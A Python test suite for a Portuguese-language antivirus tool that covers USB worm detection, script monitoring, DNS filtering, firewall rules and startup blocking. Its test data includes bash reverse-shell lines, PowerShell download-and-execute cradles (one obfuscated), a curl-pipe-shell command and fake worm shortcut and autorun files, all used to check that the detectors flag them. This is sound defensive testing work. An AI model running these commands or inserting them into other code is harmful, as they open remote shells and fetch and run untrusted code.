"""Testes das proteções: pen drive, scripts por dentro, DNS da Mullvad, firewall, inicialização e instalação."""
import json
import os
import shutil
import socket
import struct
import subprocess
import sys
import textwrap
import threading
import time
import http.server

import pytest

from exeav import config, dnsguard, firewall, paths, scriptguard, usbguard
from exeav.bootguard import AVISO, BLOQUEADO, LIBERADO, BootGuard, item_key
from exeav.engine.engine import Engine
from exeav.engine.models import MALICIOUS, SUSPICIOUS
from exeav.quarantine import Quarantine
from exeav.system import startup
from samples import eicar

LINUX = sys.platform.startswith("linux")
WINDOWS = sys.platform.startswith("win")


@pytest.fixture()
def eng():
    return Engine(config.Settings())


# =========================================================================== pen drive
def _fake_drive(root):
    return usbguard.Drive(str(root), "/dev/sdz1", "vfat", "PENDRIVE", 64 << 20)


def test_usb_inspect_root_finds_usb_worm_tricks(tmp_path):
    (tmp_path / "Documentos").mkdir()
    (tmp_path / "Documentos.lnk").write_bytes(b"L\0\0\0cmd.exe /c start wscript.exe //B x.vbs & explorer Documentos")
    (tmp_path / "autorun.inf").write_text("[autorun]\nopen=sys\\virus.exe\n")
    (tmp_path / "foto.jpg").write_bytes(b"\xff\xd8\xff\xe0 normal")
    kinds = {f.kind: f for f in usbguard.inspect_root(str(tmp_path))}
    assert set(kinds) == {"atalho", "autorun"}
    assert kinds["atalho"].hidden_target.endswith("Documentos")
    assert usbguard.finding_result(kinds["atalho"]).verdict == MALICIOUS
    assert usbguard.finding_result(kinds["autorun"]).verdict == SUSPICIOUS


def test_usb_clean_drive_has_no_findings(tmp_path):
    (tmp_path / "Fotos").mkdir()
    (tmp_path / "Fotos" / "a.jpg").write_bytes(b"\xff\xd8\xff\xe0")
    (tmp_path / "leia-me.txt").write_text("ola")
    assert usbguard.inspect_root(str(tmp_path)) == []


def test_usb_guard_scans_on_insert_quarantines_and_restores_hidden_folder(tmp_path, eng):
    root = tmp_path / "PENDRIVE"
    root.mkdir()
    (root / "Fotos").mkdir()
    (root / "Fotos" / "eicar.com").write_bytes(eicar())
    (root / "Fotos" / "ferias.txt").write_text("fotos das férias")
    hidden = root / ("Trabalho" if WINDOWS else ".Trabalho")
    hidden.mkdir()
    (hidden / "planilha.csv").write_text("a,b\n1,2\n")
    if WINDOWS:
        subprocess.run(["attrib", "+h", "+s", str(hidden)], check=True)
    (root / "Trabalho.lnk").write_bytes(b"L\0\0\0\x01\x14\x02\0cmd.exe /c start wscript.exe //B .\\x.vbs")
    plugged = {"on": False}
    events = []
    done = threading.Event()

    def cb(kind, data):
        events.append(kind)
        if kind == "done":
            done.set()
    q = Quarantine()
    before = len(q.items())
    g = usbguard.UsbGuard(eng, q, cb, interval=0.2, lister=lambda: [_fake_drive(root)] if plugged["on"] else [])
    g.start()
    try:
        plugged["on"] = True                       # "conecta" o pen drive
        assert done.wait(60), events
    finally:
        g.stop()
    assert "inserted" in events and "finding" in events and "threat" in events
    assert not (root / "Fotos" / "eicar.com").exists()           # vírus isolado
    assert (root / "Fotos" / "ferias.txt").exists()              # arquivo do usuário intacto
    assert not (root / "Trabalho.lnk").exists()                  # atalho falso isolado
    assert len(q.items()) >= before + 2
    if WINDOWS:
        import stat
        assert not os.stat(hidden).st_file_attributes & stat.FILE_ATTRIBUTE_HIDDEN
    else:
        assert (root / "Trabalho" / "planilha.csv").exists()     # pasta escondida voltou a aparecer


def test_usb_list_removable_never_crashes():
    assert isinstance(usbguard.list_removable(), list)


# =========================================================================== scripts por dentro
_PS_XML = """<Events><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>
<EventID>4104</EventID><EventRecordID>{rec}</EventRecordID><Execution ProcessID='{pid}' ThreadID='1'/></System>
<EventData><Data Name='MessageNumber'>{n}</Data><Data Name='MessageTotal'>{t}</Data>
<Data Name='ScriptBlockText'>{text}</Data><Data Name='ScriptBlockId'>abc</Data><Data Name='Path'></Data>
</EventData></Event></Events>"""


def test_parse_powershell_events_and_join_parts(eng):
    a = scriptguard.parse_events(_PS_XML.format(rec=10, pid=4321, n=1, t=2, text="IEX (New-Object Net.WebC"))
    b = scriptguard.parse_events(_PS_XML.format(rec=11, pid=4321, n=2, t=2,
                                                text="lient).DownloadString('http://x.test/a')"))
    assert a[0]["record"] == 10 and a[0]["pid"] == 4321 and a[0]["total"] == 2
    g = scriptguard.ScriptGuard(eng)
    assert g._join_parts(a[0]) is None
    joined = g._join_parts(b[0])
    assert joined == "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    assert g.analyze_code(joined, 0, "PowerShell").verdict == SUSPICIOUS      # texto num arquivo: só suspeito
    g._seen.clear()
    res = g.analyze_code(joined, 0, "PowerShell", runtime=True)               # executando na memória: malicioso
    assert res.verdict == MALICIOUS and any(i.id == "script.runtime_cradle" for i in res.indicators)
    g._seen.clear()
    https = "iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"
    assert g.analyze_code(https, 0, "PowerShell", runtime=True).verdict != MALICIOUS  # instalador legítimo
    assert g.analyze_code("Get-ChildItem C:\\Users | Sort-Object Length", 0, "PowerShell").verdict == "limpo"


def test_script_guard_kills_process_running_malicious_code(eng):
    victim = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
    try:
        g = scriptguard.ScriptGuard(eng, callback=lambda *a: None)
        res = g.analyze_code("powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient)."
                             "DownloadString('http://x.test/a')\"", victim.pid, "PowerShell")
        assert res.verdict == MALICIOUS and "encerrado" in res.action
        victim.wait(10)
    finally:
        if victim.poll() is None:
            victim.kill()


def test_script_guard_never_kills_itself(eng):
    g = scriptguard.ScriptGuard(eng)
    res = g.analyze_code("bash -i >& /dev/tcp/203.0.113.5/4444 0>&1", os.getpid(), "bash")
    assert res.verdict == MALICIOUS and "encerrado" not in res.action


@pytest.mark.skipif(not LINUX, reason="Linux")
def test_script_guard_reads_self_deleting_script(tmp_path, eng):
    sp = tmp_path / "atualizar.sh"
    sp.write_text(textwrap.dedent('''\
        #!/bin/bash
        rm -f -- "$0"
        sleep 30
        conectar() { bash -i >& /dev/tcp/203.0.113.5/4444 0>&1; }
        '''))
    found = []
    g = scriptguard.ScriptGuard(eng, callback=lambda k, d: k != "status" and found.append((k, d)), interval=0.2)
    g.start()
    try:
        time.sleep(0.5)
        p = subprocess.Popen(["bash", str(sp)])
        for _ in range(60):
            if p.poll() is not None:
                break
            time.sleep(0.2)
        killed = p.poll() is not None
        if not killed:
            p.kill()
    finally:
        g.stop()
    assert not sp.exists()
    assert killed, found
    k, res = found[0]
    assert k == "threat" and "apagado" in res.path and any(i.id == "script.deleted" for i in res.indicators)


@pytest.mark.skipif(not LINUX, reason="Linux")
def test_script_guard_flags_curl_pipe_shell(tmp_path, eng):
    bindir = tmp_path / "bin"
    bindir.mkdir()
    fake = bindir / "curl"
    fake.write_text("#!/bin/sh\necho 'echo instalando; sleep 20'\nsleep 20\n")
    fake.chmod(0o755)
    found = []
    g = scriptguard.ScriptGuard(eng, callback=lambda k, d: k != "status" and found.append((k, d)), interval=0.2)
    g.start()
    p = subprocess.Popen(["sh", "-c", "curl -s http://instalador.example.test/x.sh | sh"],
                         env=dict(os.environ, PATH=f"{bindir}:{os.environ['PATH']}"), start_new_session=True,
                         stdout=subprocess.DEVNULL)
    try:
        for _ in range(40):
            if found:
                break
            time.sleep(0.2)
    finally:
        g.stop()
        import signal
        os.killpg(p.pid, signal.SIGKILL)
    assert found and found[0][0] == "suspeito"
    assert "instalador.example.test" in found[0][1].path


@pytest.mark.skipif(not WINDOWS, reason="somente Windows (registro de blocos de script do PowerShell)")
def test_powershell_script_block_logging_real(eng):
    if not firewall.is_admin():
        pytest.skip("requer administrador")
    was = scriptguard.logging_enabled()
    scriptguard.enable_logging(True)
    found = []
    g = scriptguard.ScriptGuard(eng, callback=lambda k, d: k != "status" and found.append((k, d)), interval=0.5)
    g.start()
    # o código malicioso só existe montado na memória: a linha de comando não mostra nada
    script = ("$p1='Down'+'load'; $p2='Str'+'ing'; $u='http://x.test/a'; "
              "$c = 'if ($false) { IEX (New-Object Net.WebClient).' + $p1 + $p2 + '(''' + $u + ''') }'; "
              "Invoke-Expression $c; Start-Sleep 40")
    p = subprocess.Popen(["powershell", "-NoProfile", "-Command", script])
    try:
        for _ in range(80):
            if p.poll() is not None:
                break
            time.sleep(0.5)
        killed = p.poll() is not None
    finally:
        g.stop()
        if p.poll() is None:
            p.kill()
        if not was:
            scriptguard.enable_logging(False)
    assert any(k == "threat" for k, _ in found), [(k, d.path, d.score) for k, d in found]
    assert killed


# =========================================================================== DNS da Mullvad / sites
def test_domain_normalization():
    assert dnsguard.normalize_domain("https://www.Exemplo.com/x?y=1") == "exemplo.com"
    assert dnsguard.normalize_domain("*.apostas.com") == "apostas.com"
    assert dnsguard.normalize_domain("café.com") == "xn--caf-dma.com"
    for bad in ("", "localhost", "a..b", "-x.com", "http://", "x.local"):
        with pytest.raises(ValueError):
            dnsguard.normalize_domain(bad)
    assert dnsguard.is_blocked_name("m.apostas.com.", {"apostas.com"})
    assert not dnsguard.is_blocked_name("naoapostas.com", {"apostas.com"})


def test_hosts_rendering_is_idempotent_and_reversible():
    orig = "127.0.0.1 localhost\n# comentário do usuário\n"
    h = dnsguard.render_hosts(orig, ["facebook.com"])
    if WINDOWS:
        orig = orig.replace("\n", "\r\n")
    assert "0.0.0.0 www.facebook.com" in h and ":: facebook.com" in h
    assert dnsguard.render_hosts(h, ["facebook.com"]) == h
    assert dnsguard.render_hosts(h, []) == orig


def test_profiles_and_resolved_config():
    assert set(dnsguard.PROFILES) == {"sem-filtro", "anuncios", "base", "estendido", "familia", "tudo"}
    assert all(p["host"].endswith("dns.mullvad.net") and p["ip4"].startswith("194.242.2.")
               for p in dnsguard.PROFILES.values())
    conf = dnsguard.resolved_conf("base")
    assert "DNS=194.242.2.4#base.dns.mullvad.net" in conf and "DNSOverTLS=yes" in conf and "Domains=~." in conf
    assert dnsguard.doh_url("familia") == "https://family.dns.mullvad.net/dns-query"


def _query(name, qid=0x1234):
    return (struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0)
            + b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00" + struct.pack(">HH", 1, 1))


def test_local_doh_server_forwards_blocks_and_fails_safely():
    seen = []

    class H(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            q = self.rfile.read(int(self.headers["Content-Length"]))
            seen.append((self.headers["Host"], self.headers["Content-Type"]))
            end = 12
            while q[end]:
                end += 1 + q[end]
            end += 5
            ans = (b"\x00\x00" + struct.pack(">HHHHH", 0x8180, 1, 1, 0, 0) + q[12:end] + b"\xc0\x0c"
                   + struct.pack(">HHIH", 1, 1, 60, 4) + bytes([1, 2, 3, 4]))
            self.send_response(200)
            self.send_header("Content-Type", "application/dns-message")
            self.send_header("Content-Length", str(len(ans)))
            self.end_headers()
            self.wfile.write(ans)

        def log_message(self, *a):
            pass
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    px = dnsguard.DohProxy("base", {"cassino.example"}, port=0,
                           upstream=("127.0.0.1", "base.dns.mullvad.net", srv.server_address[1], False))
    px.start()

    def udp(name):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(8)
        s.sendto(_query(name), ("127.0.0.1", px.port))
        r = s.recv(4096)
        s.close()
        return r
    try:
        r = udp("exemplo.com.br")
        assert r[:2] == b"\x12\x34" and r[3] & 15 == 0 and r[-4:] == bytes([1, 2, 3, 4])
        s = socket.create_connection(("127.0.0.1", px.port), 5)
        q = _query("exemplo.com.br", 0x4321)
        s.sendall(struct.pack(">H", len(q)) + q)
        n = struct.unpack(">H", s.recv(2))[0]
        r = s.recv(n)
        s.close()
        assert r[:2] == b"\x43\x21" and r[-4:] == bytes([1, 2, 3, 4])
        assert udp("cassino.example")[3] & 15 == 3              # NXDOMAIN
        assert udp("www.jogo.cassino.example")[3] & 15 == 3     # subdomínio também
        assert seen[0] == ("base.dns.mullvad.net", "application/dns-message")
        srv.shutdown()
        srv.server_close()
        t = time.time()
        assert udp("outro.com")[3] & 15 == 2                     # SERVFAIL rápido, sem travar
        assert time.time() - t < 7.5
    finally:
        px.stop()


# =========================================================================== firewall
def test_opensnitch_rule_format(tmp_path, monkeypatch):
    monkeypatch.setattr(firewall, "OPENSNITCH_RULES", tmp_path)
    monkeypatch.setattr(firewall, "app_backend", lambda: "opensnitch")
    target = tmp_path / "programa-suspeito"
    target.write_bytes(b"\x7fELF")
    assert firewall.block_app(str(target), "teste")
    rule = json.loads(next(tmp_path.glob("exeav-bloqueio-*.json")).read_text())
    assert rule["action"] == "deny" and rule["duration"] == "always" and rule["enabled"]
    assert rule["operator"] == {"type": "simple", "operand": "process.path", "sensitive": False,
                                "data": str(target), "list": []}
    firewall.unblock_app(str(target))
    assert not list(tmp_path.glob("exeav-bloqueio-*.json"))
    assert str(target) not in firewall.blocked_apps()


def test_block_app_refuses_antivirus_itself():
    with pytest.raises(ValueError):
        firewall.block_app(sys.executable if not paths.IS_FROZEN else sys.argv[0], "teste")


def test_firewalld_commands(monkeypatch):
    calls = []

    class R:
        returncode, stdout, stderr = 0, "", ""
    monkeypatch.setattr(firewall, "_run", lambda cmd, check=True, timeout=30: calls.append(cmd) or R())
    firewall._apply("203.0.113.50", "firewalld")
    flat = [" ".join(c) for c in calls]
    assert any("--new-policy exeav-saida" in c for c in flat)
    assert any('destination address="203.0.113.50" reject' in c for c in flat)
    assert any('source address="203.0.113.50" drop' in c for c in flat)
    assert flat[-1] == "firewall-cmd --reload"


@pytest.mark.skipif(not (LINUX and os.geteuid() == 0 and shutil.which("nft")), reason="Linux, root e nftables")
def test_firewall_rules_come_back_after_reboot(monkeypatch):
    if subprocess.run(["nft", "list", "tables"], capture_output=True).returncode:
        pytest.skip("nftables sem permissão")
    monkeypatch.setattr(firewall, "backend", lambda refresh=False: "nft")
    ip = "203.0.113.61"
    assert firewall.block(ip, "teste")
    try:
        subprocess.run(["nft", "delete", "table", "inet", "exeav"], check=True)    # reiniciar apaga as regras
        assert ip not in subprocess.run(["nft", "list", "ruleset"], capture_output=True, text=True).stdout
        assert firewall.reapply() >= 1
        assert ip in subprocess.run(["nft", "list", "table", "inet", "exeav"], capture_output=True, text=True).stdout
    finally:
        firewall.unblock(ip)


@pytest.mark.skipif(not WINDOWS, reason="somente Windows")
def test_windows_block_program_real(tmp_path):
    if not firewall.is_admin():
        pytest.skip("requer administrador")
    exe = tmp_path / "programa.exe"
    shutil.copy(os.path.join(os.environ["SystemRoot"], "System32", "where.exe"), exe)
    assert firewall.block_app(str(exe), "teste")
    try:
        assert firewall._app_rule_present(str(exe), "windows")
    finally:
        firewall.unblock_app(str(exe))
    assert not firewall._app_rule_present(str(exe), "windows")


# =========================================================================== inicialização
def _desktop_item(path, target, name):
    return {"source": "Autostart (usuário)", "name": name, "command": f"{target} --x", "location": str(path),
            "kind": "desktop", "target": str(target), "removable": True,
            "suspicious": bool(startup.SUSPICIOUS_CMD.search(f"{target} --x"))}


def test_boot_guard_decisions(tmp_path, eng):
    unknown = tmp_path / "updater"
    unknown.write_bytes(b"#!/bin/sh\nsleep 1\n")
    evil = tmp_path / "servico.sh"
    evil.write_text("#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n")
    sysbin = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "where.exe") if WINDOWS \
        else shutil.which("sleep")
    items = [_desktop_item(tmp_path / "a.desktop", unknown, "updater"),
             _desktop_item(tmp_path / "b.desktop", evil, "servico"),
             _desktop_item(tmp_path / "c.desktop", sysbin, "sistema")]
    eng.settings.startup_policy = {}
    eng.settings.boot_block_mode = "desconhecidos"
    g = BootGuard(eng, Quarantine())
    d = {x["item"]["name"]: x for x in g.classify(items)}
    assert d["updater"]["decision"] == BLOQUEADO
    assert d["servico"]["decision"] == BLOQUEADO and "vírus" in d["servico"]["reason"]
    if d["sistema"]["trusted"]:
        assert d["sistema"]["decision"] == LIBERADO
    eng.settings.startup_policy = {item_key(items[0]): LIBERADO}
    assert {x["item"]["name"]: x for x in g.classify(items)}["updater"]["decision"] == LIBERADO
    eng.settings.boot_block_mode = "avisar"
    eng.settings.startup_policy = {}
    assert all(x["decision"] in (AVISO, LIBERADO) for x in g.classify(items))
    eng.settings.boot_block_mode = "desconhecidos"


def test_boot_guard_blocks_restores_and_runs_once_per_boot(tmp_path, eng, monkeypatch):
    prog = tmp_path / ("updater.exe" if WINDOWS else "updater")
    shutil.copy(sys.executable, prog) if WINDOWS else prog.write_bytes(open(shutil.which("sleep"), "rb").read())
    prog.chmod(0o755)
    entry = tmp_path / "updater.desktop"
    entry.write_text(f"[Desktop Entry]\nExec={prog} 300\n")
    item = _desktop_item(entry, prog, "updater")
    item["kind"] = "arquivo" if WINDOWS else "desktop"
    current = [item]
    monkeypatch.setattr(firewall, "app_backend", lambda: None)
    running = subprocess.Popen([str(prog), "-c", "import time; time.sleep(300)"] if WINDOWS else [str(prog), "300"])
    eng.settings.startup_policy = {}
    eng.settings.boot_scan = False
    eng.settings.last_boot_handled = 0.0
    events = []
    g = BootGuard(eng, Quarantine(), lambda k, d: events.append(k), lister=lambda: list(current))
    try:
        assert g.on_boot()                       # primeira vez neste boot: executa
        running.wait(10)                         # o programa que abriu junto foi encerrado
        assert not entry.exists()                # e saiu da inicialização (cópia de segurança guardada)
        assert "blocked" in events
        assert not g.on_boot()                   # mesmo boot: não repete
        rec = next(r for r in startup.list_disabled() if r["item"]["location"] == str(entry))
        g.allow(item_key(item), rec["id"], str(prog))
        assert entry.exists()                    # "Liberar" devolve à inicialização
        assert g.classify([item])[0]["decision"] == LIBERADO
        # item novo aparece com o computador ligado
        new_entry = tmp_path / "novo.desktop"
        new_entry.write_text("x")
        new_item = _desktop_item(new_entry, tmp_path / "nao-existe", "novo")
        current.append(new_item)
        nd = g.watch_once()
        assert [x["item"]["name"] for x in nd] == ["novo"] and nd[0]["decision"] == BLOQUEADO
    finally:
        if running.poll() is None:
            running.kill()


# =========================================================================== instalação
@pytest.mark.skipif(not LINUX, reason="Linux")
def test_linux_install_and_uninstall(tmp_path, monkeypatch):
    from exeav.system import install
    monkeypatch.setenv("HOME", str(tmp_path))
    done = install.install(autostart_on=True)
    menu = tmp_path / ".local/share/applications/exe-antivirus.desktop"
    auto = tmp_path / ".config/autostart/exe-antivirus.desktop"
    assert menu.exists() and auto.exists() and len(done) == 2
    assert "--boot" in auto.read_text() and "Exec=" in menu.read_text()
    install.uninstall()
    assert not menu.exists() and not auto.exists()


@pytest.mark.skipif(not WINDOWS, reason="somente Windows")
def test_windows_autostart_task_real():
    from exeav.system import autostart
    if not firewall.is_admin():
        pytest.skip("requer administrador")
    had = autostart.task_exists()
    autostart.set_enabled(True)
    try:
        assert autostart.task_exists() and autostart.is_enabled()
        r = subprocess.run(["schtasks", "/Query", "/TN", autostart.TASK_NAME, "/V", "/FO", "LIST"],
                           capture_output=True, text=True)
        assert "--boot" in r.stdout
    finally:
        if not had:
            autostart.set_enabled(False)
    if not had:
        assert not autostart.task_exists()
